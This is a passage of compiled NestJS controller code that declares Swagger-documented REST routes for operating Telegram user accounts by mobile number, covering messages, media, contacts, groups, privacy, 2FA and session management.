    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.ProfilePhotoDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.ProfilePhotoDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "setProfilePhoto", null);
__decorate([
    (0, common_1.Delete)('profile/photos/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete all profile photos' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "deleteProfilePhotos", null);
__decorate([
    (0, common_1.Get)('messages/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get chat messages' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'limit', required: false, type: Number }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('limit')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getMessages", null);
__decorate([
    (0, common_1.Post)('message/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Send a Telegram message as a user' }),
    (0, swagger_1.ApiParam)({
        name: 'mobile',
        description: 'Mobile number of the user account to send the message from',
        required: true,
        example: '1234567890',
    }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, send_message_dto_1.SendMessageDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "sendMessage", null);
__decorate([
    (0, common_1.Post)('messages/forward/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Forward messages' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.ForwardBatchDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.ForwardBatchDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "forwardMessage", null);
__decorate([
    (0, common_1.Post)('batch-process/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Process operations in batches' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.BatchProcessDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.BatchProcessDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "processBatchMessages", null);
__decorate([
    (0, common_1.Get)('messages/search/:mobile'),
    (0, swagger_1.ApiOperation)({
        summary: 'Search messages in Telegram',
        description: 'Search for messages in a specific chat or globally across all chats'
    }),
    (0, swagger_1.ApiOkResponse)({
        description: 'Messages successfully found',
        type: message_search_dto_1.SearchMessagesResponseDto
    }),
    (0, swagger_1.ApiBadRequestResponse)({ description: 'Invalid request parameters' }),
    (0, swagger_1.ApiNotFoundResponse)({ description: 'Mobile number not registered' }),
    (0, swagger_1.ApiUnauthorizedResponse)({ description: 'Unauthorized access' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, message_search_dto_1.SearchMessagesDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "searchMessages", null);
__decorate([
    (0, common_1.Get)('channels/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get channel information' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'includeIds', required: false, type: Boolean }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('includeIds')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Boolean]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getChannelInfo", null);
__decorate([
    (0, common_1.Post)('forwardMediatoMe/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Forward media messages to me' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'channel', description: 'Channel username or ID', required: false }),
    (0, swagger_1.ApiQuery)({ name: 'fromChatId', description: 'Source chat ID to forward messages from', required: false }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('channel')),
    __param(2, (0, common_1.Query)('fromChatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "forwardMedia", null);
__decorate([
    (0, common_1.Post)('channels/leave/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Leave channel' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'channel', description: 'Channel ID/username', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('channel')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "leaveChannel", null);
__decorate([
    (0, common_1.Patch)('username/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update the Telegram username of a user' }),
    (0, swagger_1.ApiParam)({
        name: 'mobile',
        description: 'Mobile number of the user whose username should be updated',
        required: true,
        example: '1234567890',
    }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_username_dto_1.UpdateUsernameDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updateUsername", null);
__decorate([
    (0, common_1.Post)('2fa/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Setup two-factor authentication' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "setup2FA", null);
__decorate([
    (0, common_1.Post)('privacy/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update privacy settings' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updatePrivacy", null);
__decorate([
    (0, common_1.Post)('privacy/batch/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update multiple privacy settings' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.PrivacySettingsDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.PrivacySettingsDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updatePrivacyBatch", null);
__decorate([
    (0, common_1.Get)('sessions/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get active sessions' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Active sessions retrieved successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getActiveSessions", null);
__decorate([
    (0, common_1.Delete)('sessions/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Terminate other sessions' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Other sessions terminated successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "terminateOtherSessions", null);
__decorate([
    (0, common_1.Post)('sessions/new/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Create new session' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'New session created successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "createNewSession", null);
__decorate([
    (0, common_1.Get)('session/info/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get session information' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getSessionInfo", null);
__decorate([
    (0, common_1.Post)('session/terminate/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Terminate specific session' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "terminateSession", null);
__decorate([
    (0, common_1.Get)('monitoring/status'),
    (0, swagger_1.ApiOperation)({ summary: 'Get service health and connection status' }),
    (0, swagger_1.ApiResponse)({ status: 200, type: connection_management_dto_1.ConnectionStatusDto }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getConnectionStatus", null);
__decorate([
    (0, common_1.Get)('monitoring/calllog/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get call log statistics' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getCallLogStats", null);
__decorate([
    (0, common_1.Post)('contacts/add-bulk/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Add multiple contacts in bulk' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.AddContactsDto }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Contacts added successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.AddContactsDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "addContactsBulk", null);
__decorate([
    (0, common_1.Get)('contacts/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get all contacts' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Contacts retrieved successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getContacts", null);
__decorate([
    (0, common_1.Post)('media/send/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Send media message' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.SendMediaDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.SendMediaDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "sendMedia", null);
__decorate([
    (0, common_1.Get)('media/download/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Download media from a message' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'messageId', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('messageId')),
    __param(3, (0, common_1.Res)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Number, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "downloadMedia", null);
__decorate([
    (0, common_1.Post)('media/album/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Send media album (multiple photos/videos)' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.SendMediaAlbumDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "sendMediaAlbum", null);
__decorate([
    (0, common_1.Get)('media/metadata/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get media metadata from a chat' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'types', enum: ['photo', 'video', 'document'], required: false, isArray: true }),
    (0, swagger_1.ApiQuery)({ name: 'startDate', required: false }),
    (0, swagger_1.ApiQuery)({ name: 'endDate', required: false }),
    (0, swagger_1.ApiQuery)({ name: 'limit', description: 'Number of messages to fetch', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'minId', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'maxId', required: false, type: Number }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('types')),
    __param(3, (0, common_1.Query)('startDate')),
    __param(4, (0, common_1.Query)('endDate')),
    __param(5, (0, common_1.Query)('limit')),
    __param(6, (0, common_1.Query)('minId')),
    __param(7, (0, common_1.Query)('maxId')),
    __param(8, (0, common_1.Query)('all')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Array, String, String, Number, Number, Number, Boolean]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getMediaMetadata", null);
__decorate([
    (0, common_1.Get)('media/filter/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get filtered media messages from a chat' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', required: true, description: 'Chat ID to get media from' }),
    (0, swagger_1.ApiQuery)({ name: 'types', required: false, enum: ['photo', 'video', 'document', 'voice'], isArray: true }),
    (0, swagger_1.ApiQuery)({ name: 'startDate', required: false, description: 'Filter media after this date' }),
    (0, swagger_1.ApiQuery)({ name: 'endDate', required: false, description: 'Filter media before this date' }),
    (0, swagger_1.ApiQuery)({ name: 'limit', required: false, type: Number, description: 'Number of media items to fetch' }),
    (0, swagger_1.ApiQuery)({ name: 'minId', required: false, type: Number, description: 'Minimum message ID' }),
    (0, swagger_1.ApiQuery)({ name: 'maxId', required: false, type: Number, description: 'Maximum message ID' }),
    (0, swagger_1.ApiResponse)({ status: 200, type: [metadata_operations_dto_1.MediaMetadataDto] }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('types')),
    __param(3, (0, common_1.Query)('startDate')),
    __param(4, (0, common_1.Query)('endDate')),
    __param(5, (0, common_1.Query)('limit')),
    __param(6, (0, common_1.Query)('minId')),
    __param(7, (0, common_1.Query)('maxId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Array, String, String, Number, Number, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getFilteredMedia", null);
__decorate([
    (0, common_1.Get)('group/members/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get group members' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'groupId', description: 'Group ID', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('groupId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getGroupMembers", null);
__decorate([
    (0, common_1.Post)('chat/block/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Block a chat/user' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', description: 'Chat/User ID to block', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "blockChat", null);
__decorate([
    (0, common_1.Delete)('chat/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Delete or clear a chat history for a user' }),
    (0, swagger_1.ApiParam)({
        name: 'mobile',
        description: 'Mobile number of the user whose chat should be deleted',
        required: true,
        example: '1234567890',
    }),
    (0, swagger_1.ApiQuery)({
        name: 'peer',
        description: 'Username or Peer ID of the chat to delete',
        required: true,
        example: 'someusername',
    }),
    (0, swagger_1.ApiQuery)({ name: 'maxId', required: false, description: 'Delete messages with ID ≤ maxId', example: 100000 }),
    (0, swagger_1.ApiQuery)({ name: 'justClear', required: false, description: 'Only clear history for this user', example: false }),
    (0, swagger_1.ApiQuery)({ name: 'revoke', required: false, description: 'Delete for everyone if possible', example: true }),
    (0, swagger_1.ApiQuery)({ name: 'minDate', required: false, description: 'Minimum date (UNIX timestamp)', example: 1609459200 }),
    (0, swagger_1.ApiQuery)({ name: 'maxDate', required: false, description: 'Maximum date (UNIX timestamp)', example: 1612137600 }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, delete_chat_dto_1.DeleteHistoryDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "deleteChatHistory", null);
__decorate([
    (0, common_1.Get)('messages/inline/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Send message with inline button' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'message', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'url', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('message')),
    __param(3, (0, common_1.Query)('url')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "sendMessageWithInlineButton", null);
__decorate([
    (0, common_1.Get)('dialogs/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get all dialogs' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'limit', required: false, type: Number, description: 'Number of dialogs to fetch', default: 500 }),
    (0, swagger_1.ApiQuery)({ name: 'offsetId', required: false, type: Number, description: 'Offset ID for pagination', default: 0 }),
    (0, swagger_1.ApiQuery)({ name: 'archived', required: false, type: Boolean, description: 'Include archived chats', default: false }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('limit')),
    __param(2, (0, common_1.Query)('offsetId')),
    __param(3, (0, common_1.Query)('archived')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Number, Number, Boolean]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getAllDialogs", null);
__decorate([
    (0, common_1.Get)('last-active/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get last active time' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Last active time retrieved successfully' }),
    __param(0, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getLastActiveTime", null);
__decorate([
    (0, common_1.Post)('group/create/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new group with advanced options' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.createGroupDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.createGroupDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "createGroupWithOptions", null);
__decorate([
    (0, common_1.Post)('group/settings/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Update group settings' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.GroupSettingsDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.GroupSettingsDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "updateGroupSettings", null);
__decorate([
    (0, common_1.Post)('group/members/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Add members to a group' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.GroupMemberOperationDto }),
    __param(0, (0, common_1.Body)()),
    __param(1, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [dto_1.GroupMemberOperationDto, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "addGroupMembers", null);
__decorate([
    (0, common_1.Delete)('group/members/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Remove members from a group' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.GroupMemberOperationDto }),
    __param(0, (0, common_1.Body)()),
    __param(1, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [dto_1.GroupMemberOperationDto, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "removeGroupMembers", null);
__decorate([
    (0, common_1.Post)('group/admin/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Promote or demote group admins' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.AdminOperationDto }),
    __param(0, (0, common_1.Body)()),
    __param(1, (0, common_1.Param)('mobile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [dto_1.AdminOperationDto, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "handleAdminOperation", null);
__decorate([
    (0, common_1.Post)('chat/cleanup/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Clean up chat history' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.ChatCleanupDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.ChatCleanupDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "cleanupChat", null);
__decorate([
    (0, common_1.Get)('chat/statistics/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get chat statistics' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', description: 'Chat ID', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'period', enum: ['day', 'week', 'month'], description: 'Statistics period', required: false }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('period')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getChatStatistics", null);
__decorate([
    (0, common_1.Post)('messages/schedule/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Schedule a message' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.ScheduleMessageDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.ScheduleMessageDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "scheduleMessage", null);
__decorate([
    (0, common_1.Get)('messages/scheduled/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get scheduled messages' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', description: 'Chat ID', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getScheduledMessages", null);
__decorate([
    (0, common_1.Post)('media/voice/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Send voice message' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "sendVoiceMessage", null);
__decorate([
    (0, common_1.Post)('media/view-once/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Send a view once (disappearing) media message' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiConsumes)('multipart/form-data', 'application/json'),
    (0, swagger_1.ApiBody)({
        schema: {
            type: 'object',
            properties: {
                chatId: { type: 'string', description: 'Chat ID to send the media to' },
                sourceType: { type: 'string', enum: ['path', 'base64', 'binary'], description: 'Source type of media' },
                path: { type: 'string', description: 'path of the media file (when sourceType is Path)' },
                base64Data: { type: 'string', description: 'Base64 data (when sourceType is base64)' },
                binaryData: { type: 'string', format: 'binary', description: 'Binary file (when sourceType is binary)' },
                caption: { type: 'string', description: 'Optional caption for the media' },
                filename: { type: 'string', description: 'Optional filename for the media' }
            },
            required: ['chatId', 'sourceType']
        }
    }),
    (0, common_1.UseInterceptors)((0, platform_express_1.FileInterceptor)('binaryData', {
        storage: multer.memoryStorage()
    })),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'View once media sent successfully' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Failed to send view once media' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.UploadedFile)()),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object, dto_1.ViewOnceMediaDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "sendViewOnceMedia", null);
__decorate([
    (0, common_1.Get)('chat/history/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Get chat history with metadata' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', required: true }),
    (0, swagger_1.ApiQuery)({ name: 'offset', required: false, type: Number }),
    (0, swagger_1.ApiQuery)({ name: 'limit', required: false, type: Number }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('chatId')),
    __param(2, (0, common_1.Query)('offset')),
    __param(3, (0, common_1.Query)('limit')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, Number, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getChatHistory", null);
__decorate([
    (0, common_1.Post)('group/admin/promote/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Promote members to admin' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.AdminOperationDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.AdminOperationDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "promoteToAdmin", null);
__decorate([
    (0, common_1.Post)('group/admin/demote/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Demote admin to regular member' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.GroupMemberOperationDto }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.GroupMemberOperationDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "demoteAdmin", null);
__decorate([
